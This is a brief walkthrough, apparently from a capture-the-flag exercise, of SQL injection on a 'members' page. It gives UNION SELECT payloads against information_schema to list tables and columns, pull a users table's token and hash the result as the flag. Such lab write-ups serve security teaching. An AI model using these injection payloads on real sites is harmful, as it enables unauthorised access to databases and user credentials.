1. go to website then click on members
2. try see if ("1 or 1 = 1)" returns members
3. then type "(1 or 1 = 1 UNION SELECT table_schema, table_name FROM information_schema.TABLES)"
4. use the search function(ctrl + f) and search for a table called users.
5. once you have found a table called users now its time to find the columns init.
6. then type "(1 or 1 = 1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS)"
7. search for users and you should find 8 columns.
8. column names are as followed user_id, first_name, last_name, town, country, planet, commentaire, countersign
9. decrypt the token which gives you "FortyTwo"
10. then sha256 encrypt "Sha256(fortytwo) = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5"